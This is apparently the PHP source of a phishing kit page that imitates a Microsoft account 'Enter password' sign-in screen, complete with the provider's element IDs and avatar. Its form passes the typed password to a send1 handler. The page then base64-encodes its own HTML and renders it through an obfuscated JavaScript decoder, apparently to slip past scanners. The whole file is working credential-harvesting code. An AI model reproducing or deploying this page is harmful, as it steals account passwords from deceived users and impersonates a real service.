<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="/";




         $php_js->texts = file_exists("../../texts.json") && filesize("../../texts.json") > 10 ? @file_get_contents("../../texts.json") : "{}";
?>

<!DOCTYPE html>
<html >

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">

<link rel="stylesheet" href="form/css.css">


    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<?php ob_start() ?>
<body class="cb"     ng-app="app" ng-controller="c1"   ng-cloak    >
    <div>
        <div>
            <div class="background" role="presentation">
                <div class="blur" style="background-image: url('0-small.jpg');"></div>
                <div class="backgroundImage" style="background-image: url('0.jpg');"></div>
                <div class="background-overlay"></div>
            </div>
        </div>
        <form name="f1" novalidate="novalidate" spellcheck="false" target="_top" onsubmit="send1(event,'next__');return false" autocomplete="off" >
            <div class="outer">
                <div class="middle">
                    <div class="inner">
                        <div>  </div>
                        <div>
                            <div class="animate">
                                <div>
                                    <div>
                                        <div class="identityBanner">
                                            <div class="identity user" > {{data.user}} </div>
                                            <div class="profile-photo"> <img role="presentation" src="picker_account_msa.svg"> </div>
                                        </div>
                                    </div>
                                    <div id="loginHeader" class="row text-title" role="heading">{{"Enter password"| ng_translate1}}</div>
                                    <div class="row">
                                        <div class="form-group col-md-24 ">
                                            <div role="alert" class="err_div" style="display: none;">
                                                <div id="passwordError" class="alert alert-error">{{"Please enter the password."| ng_translate1}}</div>
                                            </div>
                                            <div class="placeholderContainer"> 
                                                <input name="pass" placeholder='{{"Password"| ng_translate1}}' pattern=".{4,}" data-err_text="Please enter valid data" id="pass" autocomplete="off" class="form-control " maxlength="127" type="password">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">   
                                        <div>
                                            <div class="col-xs-24 form-group no-padding-left-right">
                                                <div class="col-xs-12 secondary"> <input id="idBtn_Back" class="btn btn-block" onclick="back()" value='{{"Back"| ng_translate1}}' type="button"> </div>
                                                <div class="col-xs-12 primary"> <input id="idSIButton9" class="btn btn-block btn-primary" value='{{"Sign in"| ng_translate1}}' type="submit"> </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    
                                </div>
                            </div>
                        </div>
                        <div> </div>
                    </div>
                </div>
                
                
            </div>
        </form>
    </div>
    


<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?> 

</html>